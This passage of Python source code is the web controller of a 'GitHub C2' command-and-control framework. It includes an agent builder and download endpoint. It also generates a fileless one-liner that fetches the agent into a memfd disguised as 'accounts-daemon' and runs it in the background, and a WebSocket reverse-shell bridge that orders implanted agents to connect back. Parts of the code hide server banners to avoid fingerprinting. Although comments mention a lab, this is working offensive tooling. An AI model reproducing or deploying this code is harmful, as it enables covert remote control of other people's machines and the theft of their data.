            out, _ = proc.communicate(timeout=600)  # 10 min max
            _builder_output = out.decode("utf-8", errors="replace") if out else ""
            # P0-3: persist actual output path so download/fileless don't
            # guess the triple. Only overwrite on success.
            if proc.returncode == 0:
                _bin = os.path.join(deploy_path, "agent", "target",
                                    arch, "release",
                                    "github-c2-agent")
                if os.path.isfile(_bin):
                    db.cfg_set(_conn(), "builder_last_bin", _bin)
        except _subprocess.TimeoutExpired:
            proc.kill()
            _builder_output = "[ERROR] Build timed out after 10 minutes"
        except Exception as e:
            _builder_output = f"[ERROR] {e}"
        finally:
            _restore_embedded_config_placeholder(config_path)

    with _builder_lock:
        _builder_output = ""
        _builder_started = time.time()

    _audit("builder_build", detail=f"deploy={deploy_path} channel={channel} repo={repo} compress={compress}")

    t = threading.Thread(target=_run_build, daemon=True, name="agent-builder")
    t.start()
    return jsonify({"ok": True, "message": "Build started"})


@app.route("/api/builder/status")
@login_required
def api_builder_status():
    conn = _conn()
    bin_path = _builder_bin_path(conn)

    with _builder_lock:
        building = _builder_proc is not None and _builder_proc.poll() is None
        exit_code = _builder_proc.returncode if _builder_proc and not building else None
        elapsed = int(time.time() - _builder_started) if _builder_started else 0
        output = _builder_output

    bin_exists = os.path.isfile(bin_path)
    bin_time = None
    bin_size = None
    build_ok = False
    if bin_exists:
        st = os.stat(bin_path)
        bin_time = datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
        bin_size = st.st_size
        # Consider build successful if file was modified after build started
        if _builder_started and st.st_mtime >= _builder_started:
            build_ok = True

    failed = (not building) and exit_code not in (None, 0)
    if not output:
        out_clip = ""
    elif failed and len(output) > 6000:
        out_clip = output[:2000] + "\n...\n" + output[-4000:]
    else:
        out_clip = output[-4000:]

    return jsonify({
        "building":   building,
        "exit_code":  exit_code,
        "elapsed":    elapsed,
        "output":     out_clip,
        "bin_exists":  bin_exists,
        "bin_time":    bin_time,
        "bin_size":    bin_size,
        "bin_path":    bin_path,
        "build_ok":    build_ok,
    })


def _builder_bin_path(conn) -> str:
    """Resolve the built binary path: prefer builder_last_bin (actual build
    output recorded on success), fall back to the configured triple's path
    (项 10 多架构；默认 musl). P0-3: prevents 404 on non-musl or non-Linux builds."""
    p = db.cfg_get(conn, "builder_last_bin") or ""
    if p and os.path.isfile(p):
        return p
    deploy_path = db.cfg_get(conn, "builder_deploy_path") or os.path.dirname(os.path.abspath(__file__))
    arch = (db.cfg_get(conn, "builder_arch") or "x86_64-unknown-linux-musl").strip()
    return os.path.join(deploy_path, "agent", "target",
                        arch, "release", "github-c2-agent")


@app.route("/api/builder/download")
@login_required
def api_builder_download():
    conn = _conn()
    bin_path = _builder_bin_path(conn)
    if not os.path.isfile(bin_path):
        return jsonify({"error": "No successful build recorded — run Build first"}), 400
    return send_file(
        bin_path,
        as_attachment=True,
        download_name="github-c2-agent",
        mimetype="application/octet-stream",
    )


# ── Fileless (memfd) deployment ────────────────────────────────────────────────
# Shellcode mode: instead of shipping the built agent binary as a file, the
# controller hands the operator a copy-paste one-liner. Running it on a Linux
# target fetches the binary straight into an anonymous memfd and fexecve's it —
# nothing ever lands on disk, no persistence is installed, reboot clears it.

_payload_tokens = {}        # token -> {"path": str, "created": float}
_payload_lock = threading.Lock()
_PAYLOAD_TTL = 24 * 3600    # fetch tokens expire after 24h


@app.route("/api/builder/fileless", methods=["POST"])
@login_required
def api_builder_fileless():
    conn = _conn()
    bin_path = _builder_bin_path(conn)
    if not os.path.isfile(bin_path):
        return jsonify({"error": "No successful build recorded — run Build first"}), 400

    # Base URL exactly as the operator's browser reaches the controller; that
    # address is by construction reachable from the lab target network.
    base = (request.host_url or "").rstrip("/")
    if not base.lower().startswith(("http://", "https://")):
        return jsonify({"error": "Could not determine controller base URL"}), 400
    # P1-7: loopback host means the target can't reach the controller —
    # warn instead of silently generating a dead URL.
    host_warn = ""
    if any(h in base for h in ("127.0.0.1", "localhost", "[::1]")):
        host_warn = " ⚠ URL uses loopback — the target machine CANNOT reach this address. Bind the controller to a reachable IP or use a reverse proxy."

    token = uuid.uuid4().hex
    now = time.time()
    with _payload_lock:
        for t in [t for t, v in _payload_tokens.items() if now - v["created"] > _PAYLOAD_TTL]:
            del _payload_tokens[t]
        _payload_tokens[token] = {"path": bin_path, "created": now}

    url = f"{base}/payload/{token}"
    size = os.path.getsize(bin_path)
    # One-liner contract (paste into a Linux shell with python3 ≥ 3.8):
    #   nohup + & background it (returns the shell instantly); the fetch goes
    #   straight to a memfd_create (named after a common system daemon), then
    #   fexecve with C2_FILELESS=1 (agent skips relocate/persist/re-exec and
    #   setsid-detaches itself). Nothing ever lands on disk.
    cmd = (
        'nohup python3 -c "import os,urllib.request as u; '
        "d=u.urlopen('" + url + "',timeout=60).read(); "
        "f=os.memfd_create('accounts-daemon'); "
        'os.write(f,d); '
        "e=dict(os.environ); e['C2_FILELESS']='1'; "
        "os.execve('/proc/self/fd/%d'%f,['accounts-daemon'],e)\" "
        ">/dev/null &"
    )
    _audit("builder_fileless", detail=f"token={token[:8]}… size={size}")
    return jsonify({
        "cmd": cmd,
        "url": url,
        "size": size,
        "ttl_hours": _PAYLOAD_TTL // 3600,
        "one_use": True,
        "warning": host_warn,
    })


@app.route("/payload/<token>")
def api_payload_fetch(token):
    # Serves the built agent to the lab target's one-liner. No session login:
    # the fetcher is a python process on the target, not the operator's browser.
    # Gate = 128-bit random token, one-use (P1-7), 24h TTL, audit.
    if not re.fullmatch(r"[0-9a-f]{32}", token):
        return jsonify({"error": "Not found"}), 404
    path = None
    with _payload_lock:
        entry = _payload_tokens.pop(token, None)   # P1-7: one-use — pop, not get
        if entry and time.time() - entry["created"] <= _PAYLOAD_TTL:
            path = entry["path"]
    if not path or not os.path.isfile(path):
        return jsonify({"error": "Not found"}), 404
    _audit("payload_fetch", detail=f"token={token[:8]}… ip={request.remote_addr} (one-use)")
    return send_file(path, mimetype="application/octet-stream")


# ── Startup ───────────────────────────────────────────────────────────────────

_load_config()
db.init_at_startup()   # create tables + trim old data once (main thread)
_hydrate_chunk_buf()

_bg = threading.Thread(target=_bg_poll, daemon=True, name="bg-poller")
_bg.start()

# ── Static file caching (1 hour for versioned assets, 5 min for HTML) ─────────
@app.after_request
def _cache_headers(resp):
    # Anti-fingerprint: no framework/Python version banner on any response.
    resp.headers.pop("Server", None)
    path = request.path
    # Never cache SSE stream or API endpoints
    if path.startswith("/stream") or path.startswith("/api/"):
        resp.headers["Cache-Control"] = "no-store"
        return resp
    # Cache JS/CSS/fonts aggressively (browser revalidates on next deploy)
    if path.startswith("/static/"):
        resp.headers["Cache-Control"] = "public, max-age=3600"
    return resp



# ═══════════════════════════════════════════════════════════════════════════════
# WS Shell — cliws bridge backend
#
# Architecture:
#   1. /api/wsshell/start  → spawn `cliws -b <port>`, send `wspty ws://ip:port` to agent
#   2. Agent ws_pty.rs     → connects to cliws on 0.0.0.0:<port>  (internet-facing)
#   3. /wsshell/ws/<id>    → browser WS; Python proxy connects to cliws on 127.0.0.1:<port+1>
#   4. cliws bridge        → relays all binary frames bidirectionally (agent ↔ browser)
#
# The agent connects first (its port is internet-accessible); the Python proxy
# connects second (its port is localhost-only, opened after agent connects).
# cliws handles ALL WebSocket framing — Python only does a simple byte relay.
# ═══════════════════════════════════════════════════════════════════════════════

import re as _re_ansi

CLIWS_DIR      = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cliws")
CLIWS_BIN      = os.path.join(CLIWS_DIR, "cliws")
CLIWS_TMUX_PFX = "c2-cliws"   # tmux session name = c2-cliws-<port>
os.makedirs(CLIWS_DIR, exist_ok=True)

# Global single cliws session (one backend)
# {"port": int, "proc": Popen|None, "tmux": str|None, "ctrl_ip": str}
_cliws_session: dict = {}
_cliws_lock = threading.Lock()

ANSI_RE = _re_ansi.compile(rb'\x1b(?:\[[0-9;]*[A-Za-z]|\][^\x07]*\x07|[^[\]])')

def _strip_ansi(data: bytes) -> bytes:
    return ANSI_RE.sub(b'', data)

def _cliws_hydrate():
    """重启后认回还在跑的 c2-cliws-<port> tmux，避免 UI 显示已停、再 Start 强杀孤儿。"""
    if not _has_tmux():
        return
    with _cliws_lock:
        if _cliws_session.get("port"):
            return
    try:
        r = _subprocess.run(
            ["tmux", "ls", "-F", "#{session_name}"],
            capture_output=True, timeout=3, text=True,
        )
    except Exception:
        return
    if r.returncode != 0:
        return
    pfx = CLIWS_TMUX_PFX + "-"
    for line in (r.stdout or "").splitlines():
        name = line.strip()
        if not name.startswith(pfx):
            continue
        try:
            port = int(name[len(pfx):])
        except ValueError:
            continue
        with _lock:
            ctrl_ip = _state.get("wspty_host", "")
        with _cliws_lock:
            if _cliws_session.get("port"):
                return
            _cliws_session.update({
                "port": port,
                "proc": None,
                "tmux": name,
                "ctrl_ip": ctrl_ip,
                "bound_agent_id": None,
                "bound_sibling_ids": [],
            })
        debug_log(f"WS Shell: hydrated orphan tmux {name}")
        return


def _wsshell_agent_allowed(agent_id: str) -> bool:
    with _cliws_lock:
        bound = _cliws_session.get("bound_agent_id")
        sibs = list(_cliws_session.get("bound_sibling_ids") or [])
    if not bound:
        return True
    aid = str(agent_id)
    if aid == str(bound) or aid in {str(x) for x in sibs}:
        return True
    return str(bound) in {str(x) for x in _sibling_ids_for(aid)}


def _cliws_running() -> bool:
    with _cliws_lock:
        sess = dict(_cliws_session)
    if not sess.get("port"):
        _cliws_hydrate()
        with _cliws_lock:
            sess = dict(_cliws_session)
    if not sess.get("port"):
        return False
    tmux_name = sess.get("tmux")
    if tmux_name and _has_tmux():
        try:
            r = _subprocess.run(
                ["tmux", "has-session", "-t", f"={tmux_name}"],
                capture_output=True, timeout=3,
            )
            if r.returncode == 0:
                return True
        except Exception:
            pass
    proc = sess.get("proc")
    return proc is not None and proc.poll() is None


def _cliws_stop():
    with _cliws_lock:
        sess = dict(_cliws_session)
        _cliws_session.clear()
    if not sess:
        return
    tmux_name = sess.get("tmux")
    if tmux_name and _has_tmux():
        try:
            _subprocess.run(
                ["tmux", "kill-session", "-t", tmux_name],
                capture_output=True, timeout=5,
            )
        except Exception:
            pass
    proc = sess.get("proc")
    if proc:
        try:
            proc.terminate()
        except Exception:
            pass
        try:
            proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass

# ── Session history (shared DB table with old ws_pty for backward compat) ────

def _ensure_pty_table():
    try:
        conn = _conn()
        conn.execute("""
            CREATE TABLE IF NOT EXISTS pty_sessions (
                session_id   TEXT PRIMARY KEY,
                agent_id     TEXT NOT NULL,
                started_at   TEXT NOT NULL,
                ended_at     TEXT,
                content_text TEXT
            )
        """)
        conn.commit()
    except Exception:
        pass

def _save_wsshell_session(agent_id: str, session_id: str,
                          started_at: str, recording: bytes):
    try:
        conn = _conn()
        text = recording.decode("utf-8", errors="replace")
        conn.execute("""
            INSERT OR REPLACE INTO pty_sessions
              (session_id, agent_id, started_at, ended_at, content_text)
            VALUES (?, ?, ?, ?, ?)
        """, (session_id, agent_id, started_at,
              datetime.now().isoformat(), db._enc(text)))
        conn.commit()
        db.pty_trim_agent(conn, agent_id, keep=20)
    except Exception as e:
        debug_log(f"WS Shell: save session failed: {e}")

# ── REST: start / connect / stop / status ────────────────────────────────────

def _cliws_start(ctrl_ip: str, port: int) -> tuple[bool, dict]:
    """Kill any leftover one-shot bridge and start a fresh cliws `-b` pair."""
    if not ctrl_ip:
        return False, {"error": "controller_ip required（配置控制端 IP）"}
    if not (1 <= int(port) <= 65534):
        return False, {"error": f"无效端口: {port}（需 1-65534）"}
    if not os.path.isfile(CLIWS_BIN):
        return False, {"error": f"cliws binary not found at {CLIWS_BIN}"}

    _cliws_stop()

    tmux_name = f"{CLIWS_TMUX_PFX}-{port}"
    proc      = None
    used_tmux = False

    if _has_tmux():
        _subprocess.run(["tmux", "kill-session", "-t", tmux_name], capture_output=True)
        r = _subprocess.run(
            ["tmux", "new-session", "-d", "-s", tmux_name,
             "-c", CLIWS_DIR, CLIWS_BIN, "-b", str(port)],
            capture_output=True, timeout=5,
        )
        if r.returncode != 0:
            return False, {
                "error": f"tmux start failed: {r.stderr.decode(errors='replace').strip()}"
            }
        used_tmux = True
    else:
        kwargs: dict = dict(
            stdout=_subprocess.DEVNULL,
            stderr=_subprocess.DEVNULL,
            cwd=CLIWS_DIR,
        )
        if hasattr(os, "setsid"):
            kwargs["preexec_fn"] = os.setsid
        proc = _subprocess.Popen([CLIWS_BIN, "-b", str(port)], **kwargs)

    with _cliws_lock:
        _cliws_session.update({
            "port":    port,
            "proc":    proc,
            "tmux":    tmux_name if used_tmux else None,
            "ctrl_ip": ctrl_ip,
            "bound_agent_id": None,
            "bound_sibling_ids": [],
        })

    # Verify cliws is actually running (port bind failure causes immediate exit)
    time.sleep(1.0)
    if not _cliws_running():
        _cliws_stop()
        return False, {"error": f"cliws 启动失败（端口 {port} 可能已被占用，或权限不足）"}

    debug_log(f"WS Shell: cliws started port={port} tmux={tmux_name if used_tmux else 'no'}")
    return True, {
        "ok":           True,
        "port":         port,
        "tmux":         used_tmux,
        "tmux_session": tmux_name if used_tmux else None,
        "attach_cmd":   f"tmux attach -t {tmux_name}" if used_tmux else None,
    }


@app.route("/api/wsshell/start", methods=["POST"])
@login_required
def api_wsshell_start():
    """Start cliws backend (no agent needed). Mirrors shellStart()."""
    data = request.json or {}

    with _lock:
        ctrl_ip   = (data.get("controller_ip")   or "").strip() or _state.get("wspty_host", "")
        ctrl_port = (data.get("controller_port") or "").strip() or _state.get("wspty_port", "7337")

    try:
        port = int(ctrl_port)
    except (TypeError, ValueError):
        return jsonify({"error": f"无效端口: {ctrl_port}（需 1-65534）"}), 400

    ok, payload = _cliws_start(ctrl_ip, port)
    if not ok:
        return jsonify(payload), 400 if "controller_ip" in payload.get("error", "") else 500
    _audit("wsshell_start", detail=f"port={port} tmux={payload.get('tmux')}")
    return jsonify(payload)


@app.route("/api/wsshell/connect", methods=["POST"])
@login_required
def api_wsshell_connect():
    """Recycle the one-shot cliws pair, then send a fresh wspty command."""
    data     = request.json or {}
    agent_id = data.get("agent_id", "")
    if not agent_id:
        return jsonify({"error": "agent_id required"}), 400

    with _cliws_lock:
        prev    = _cliws_session.get("bound_agent_id")
        sess_ip = _cliws_session.get("ctrl_ip", "")
        sess_pt = _cliws_session.get("port")
    with _lock:
        ctrl_ip   = (data.get("controller_ip") or "").strip() or sess_ip or _state.get("wspty_host", "")
        ctrl_port = (data.get("controller_port") or "").strip() or (
            str(sess_pt) if sess_pt else _state.get("wspty_port", "7337")
        )

    try:
        port = int(ctrl_port)
    except (TypeError, ValueError):
        return jsonify({"error": f"无效端口: {ctrl_port}（需 1-65534）"}), 400

    # Stop leftover agent wspty first. A reconnecting agent will occupy the
    # next one-shot slot and the browser gets "connected, 0 bytes".
    _internal_send(agent_id, "wspty:close")
    if prev and str(prev) != str(agent_id):
        _internal_send(prev, "wspty:close")
        debug_log(f"WS Shell: wspty:close before reconnect (was {prev})")

    ok_start, start_info = _cliws_start(ctrl_ip, port)
    if not ok_start:
        return jsonify(start_info), 500

    ws_url = f"ws://{ctrl_ip}:{port}/stream/{agent_id}"
    ok, result = _internal_send(agent_id, f"wspty {ws_url}")
    if not ok:
        _cliws_stop()
        debug_log(f"WS Shell: wspty send failed, cliws rolled back: {result}")
        return jsonify({"error": result}), 500

    with _cliws_lock:
        _cliws_session["bound_agent_id"] = agent_id
        _cliws_session["bound_sibling_ids"] = _sibling_ids_for(agent_id)
    debug_log(f"WS Shell: recycled cliws + wspty {ws_url} → agent {agent_id}")
    _audit("wsshell_connect", agent_id, ws_url)
    return jsonify({
        "ok": True,
        "ws_url": ws_url,
        "command_id": result,
        "recycled": True,
        "tmux_session": start_info.get("tmux_session"),
        "attach_cmd": start_info.get("attach_cmd"),
        "port": port,
    })


@app.route("/api/wsshell/disconnect", methods=["POST"])
@login_required
def api_wsshell_disconnect():
    """Disconnect agent only — cliws backend stays running."""
    data     = request.json or {}
    agent_id = data.get("agent_id", "")
    if agent_id:
        _internal_send(agent_id, "wspty:close")
        debug_log(f"WS Shell: wspty:close sent to agent {agent_id}")
    with _cliws_lock:
        _cliws_session["bound_agent_id"] = None
        _cliws_session["bound_sibling_ids"] = []
    return jsonify({"ok": True})


@app.route("/api/wsshell/stop", methods=["POST"])
@login_required
def api_wsshell_stop():
    """Stop cliws backend entirely (also disconnects any agent)."""
    data     = request.json or {}
    agent_id = data.get("agent_id", "")
    if agent_id:
        _internal_send(agent_id, "wspty:close")
    _cliws_stop()
    _audit("wsshell_stop", agent_id)
    return jsonify({"ok": True})


@app.route("/api/wsshell/status")
@login_required
def api_wsshell_status():
    """Global cliws backend status."""
    running = _cliws_running()
    with _cliws_lock:
        sess = dict(_cliws_session) if running else {}
        return jsonify({
        "active":       running,
        "port":         sess.get("port"),
        "ctrl_ip":      sess.get("ctrl_ip"),
        "tmux_session": sess.get("tmux"),
        "attach_cmd":   f"tmux attach -t {sess['tmux']}" if sess.get("tmux") else None,
        "bound_agent_id": sess.get("bound_agent_id"),
        "bound_sibling_ids": sess.get("bound_sibling_ids") or [],
    })


# ── WebSocket proxy: browser ↔ cliws bridge ──────────────────────────────────

@_sock.route("/wsshell/ws/<agent_id>")
def wsshell_ws_proxy(ws, agent_id: str):
    """Proxy browser xterm.js ↔ cliws bridge (proxy port = agent_port + 1)."""
    if not session.get("logged_in"):
        ws.close(message=b"Unauthorized")
        return

    if not _cliws_running():
        ws.close(message=b"No active cliws session")
        return

    if not _wsshell_agent_allowed(agent_id):
        ws.close(message=b"WS Shell bound to another agent")
        return

    with _cliws_lock:
        port = _cliws_session.get("port")
    if not port:
        ws.close(message=b"cliws port unknown")
        return

    proxy_port = port + 1
    cliws_url  = f"ws://127.0.0.1:{proxy_port}"

    # Retry connecting to cliws proxy port.
    # Both ports are bound at startup, but the WS handshake on proxy_port
    # only completes after cliws has also accepted the agent on agent_port.
    # Give up to 90s for the agent to receive the C2 command and connect.
    #
    # snapshot_port: if a new cliws session starts (different port or restart),
    # the old proxy must NOT connect to the new session — bail out immediately.
    snapshot_port = port
    cliws = None
    for attempt in range(90):
        try:
            cliws = _websocket_client.create_connection(cliws_url, timeout=3)
            break
        except Exception:
            with _cliws_lock:
                cur_port = _cliws_session.get("port")
            if cur_port != snapshot_port or not _cliws_running():
                break
            time.sleep(1)

    if not cliws:
        debug_log(f"WS Shell: cannot connect to cliws proxy {cliws_url}")
        ws.close(message=b"Cannot connect to cliws bridge")
        return

    cliws.settimeout(None)

    recording  = bytearray()
    session_id = uuid.uuid4().hex
    started_at = datetime.now().isoformat()

    stop_evt = threading.Event()

    def cliws_to_browser():
        while not stop_evt.is_set():
            try:
                raw = cliws.recv()
                # websocket-client returns None or "" on close/error
                if not raw:
                    break
                data = raw if isinstance(raw, (bytes, bytearray)) else raw.encode()
                if not data:
                    continue
                recording.extend(_strip_ansi(data))
                if len(recording) > 10 * 1024 * 1024:
                    del recording[: len(recording) - 9 * 1024 * 1024]
                ws.send(data)
            except Exception:
                break
        stop_evt.set()
        # Proactively close browser WS so ws.receive() in the main loop below
        # unblocks immediately instead of hanging until the browser sends data.
        try:
            ws.close()
        except Exception:
            pass

    t = threading.Thread(target=cliws_to_browser, daemon=True)
    t.start()

    while not stop_evt.is_set():
        try:
            data = ws.receive()
            if data is None:
                break
            raw = data if isinstance(data, (bytes, bytearray)) else data.encode()
            cliws.send_binary(raw)
        except Exception:
            break

    stop_evt.set()
    try:
        cliws.close()
    except Exception:
        pass

    _save_wsshell_session(agent_id, session_id, started_at, bytes(recording))

    # Always stop the agent side. cliws `-b` cannot resume a pair after the
    # proxy hangs up; leaving wspty running just auto-reconnects and poisons
    # the next browser session (connect, 1ms close, no data).
    _internal_send(agent_id, "wspty:close")
    debug_log(f"WS Shell: browser proxy closed, wspty:close sent to agent={agent_id}")

    debug_log(f"WS Shell: browser proxy closed for agent={agent_id}")


# ── Historical sessions (kept for session viewer in UI) ──────────────────────

@app.route("/api/wspty/sessions/<agent_id>")
@login_required
def api_wspty_sessions(agent_id: str):
    try:
        conn = _conn()
        ids = _sibling_ids_for(agent_id)
        placeholders = ",".join("?" * len(ids))
        rows = conn.execute(f"""
            SELECT session_id, started_at, ended_at,
                   length(content_text) as bytes
            FROM pty_sessions WHERE agent_id IN ({placeholders})
            ORDER BY started_at DESC LIMIT 50
        """, ids).fetchall()
        return jsonify([{
            "session_id": r[0], "started_at": r[1],
            "ended_at": r[2], "bytes": r[3]
        } for r in rows])
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/wspty/session/<session_id>")
@login_required
def api_wspty_session_content(session_id: str):
    try:
        # agent_id 必填：录屏属于具体 agent，防止仅凭 session_id 横向读取他机录屏
        agent_id = request.args.get("agent_id", "")
        if not agent_id:
            return jsonify({"error": "agent_id required"}), 400
        conn = _conn()
        query  = "SELECT content_text FROM pty_sessions WHERE session_id=? AND agent_id=?"
        row = None
        for aid in _sibling_ids_for(agent_id):
            row = conn.execute(query, (session_id, aid)).fetchone()
            if row:
                break
        if not row:
            return jsonify({"error": "session not found"}), 404
        return jsonify({"content": db._dec(row[0])})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# Initialize PTY DB table at module load
_ensure_pty_table()
_cliws_hydrate()


if __name__ == "__main__":
    import argparse

    # Scrub credential query params from the werkzeug access log —
    # "?login=admin&pass=SECRET" must never land in logs/controller.log.
    class _QueryScrub(logging.Filter):
        _pat = re.compile(r"(login|pass|password|token|secret)=[^ &]*", re.IGNORECASE)

        def filter(self, record):
            if isinstance(record.msg, str):
                record.msg = self._pat.sub(r"\1=***", record.msg)
            return True

    logging.getLogger("werkzeug").addFilter(_QueryScrub())

    # Suppress the default "Werkzeug/x.x Python/x.y" Server banner.
    from werkzeug.serving import WSGIRequestHandler

    class _QuietHandler(WSGIRequestHandler):
        def version_string(self):
            return ""

    _ap = argparse.ArgumentParser(description="GitHub C2 Web Controller")
    # Default bind is loopback-only for lab safety; pass --host 0.0.0.0 (or use
    # deploy-web.sh, which prompts) when the controller must be reachable remotely.
    _ap.add_argument("--host", default=os.environ.get("C2_BIND", "127.0.0.1"))
    _ap.add_argument("--port", type=int, default=int(os.environ.get("C2_PORT", "8080")))
    _args = _ap.parse_args()

    print("=" * 50)
    print("GitHub C2 Web Controller")
    print(f"DB      : {db.DB_PATH}")
    print(f"Downloads: {DOWNLOADS_DIR}")
    print(f"Open    : http://{_args.host}:{_args.port}")
    print("=" * 50)
    app.run(host=_args.host, port=_args.port, debug=False, threaded=True,
            request_handler=_QuietHandler)
